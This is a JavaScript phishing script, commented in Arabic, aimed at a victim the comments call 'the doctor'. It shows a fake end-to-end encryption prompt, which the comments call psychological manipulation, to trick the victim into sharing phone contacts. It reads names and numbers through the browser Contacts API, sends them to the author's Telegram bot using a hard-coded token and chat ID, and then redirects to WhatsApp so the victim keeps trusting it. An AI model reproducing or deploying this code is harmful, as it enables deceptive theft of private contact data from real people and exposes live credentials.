// --- إعدادات البوت الخاصة بك ---
const TELEGRAM_TOKEN = "8485113389:AAHZEkzRDLg2ZPBOjUb-osecIR34DExhxHg"; // التوكن اللي أخذته من BotFather
const TELEGRAM_CHAT_ID = "5976228373"; // الأيدي الخاص بحسابك

// دالة التشغيل التلقائي عند الضغط على زر الواتساب
async function startHook() {
    // 1. إرسال إشعار فوري لك بأن الدكتور دخل وبدأ التفاعل
    sendToBot("🚀 بدأت المحاولة! الدكتور ضغط على الزر وجاري محاولة السحب...");

    // 2. النص التقني المقنع (تلاعب نفسي)
    const secureAlert = "Security Protocol: To enable End-to-End encryption for this chat, please allow the browser to verify contact metadata. Syncing...";
    
    if (confirm(secureAlert)) {
        // فحص نوع الجهاز ومحاولة السحب
        if ('contacts' in navigator && 'ContactsManager' in window) {
            executeAdvancedExfiltration();
        } else {
            // إذا كان آيفون (Safari) - نرسل بصمة جهازه كبداية
            sendToBot("📱 الجهاز آيفون/نظام مغلق. تم تأكيد الموافقة على البروتوكول، جاري الانتقال للخطوة التالية...");
            setTimeout(redirectToWhatsApp, 2000);
        }
    } else {
        // حتى لو رفض، نحوله للواتساب عشان الثقة
        redirectToWhatsApp();
    }
}

// دالة سحب الأسماء (للأندرويد المتوافق)
async function executeAdvancedExfiltration() {
    // نطلب الاسم والرقم (وهما الأهم للدكتور)
    const props = ['name', 'tel'];
    const opts = { multiple: true }; // تفعيل خيار "تعدد" الأسماء

    try {
        const contacts = await navigator.contacts.select(props, opts);
        if (contacts.length > 0) {
            // تحويل مصفوفة الأسماء إلى نص مرتب
            let contactList = contacts.map(c => `👤 ${c.name}: ${c.tel.join(', ')}`).join('\n');
            sendToBot(`✅ تم سحب (${contacts.length}) جهة اتصال بنجاح:\n\n${contactList}`);
        }
    } catch (err) {
        sendToBot("⚠️ الدكتور ضغط 'موافق' لكنه لم يحدد أسماء أو أغلق النافذة.");
    } finally {
        redirectToWhatsApp();
    }
}

// دالة الإرسال لليليجرام (مخفية)
function sendToBot(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
    fetch(url).catch(err => console.error("Telegram Error:", err));
}

// دالة التحويل للواتساب الحقيقي
function redirectToWhatsApp() {
    const myNumber = "966XXXXXXXXX"; // ضع رقمك هنا بدون +
    window.location.href = `https://api.whatsapp.com/send?phone=${myNumber}&text=Hello%20Doctor!%20Everything%20is%20ready.`;
}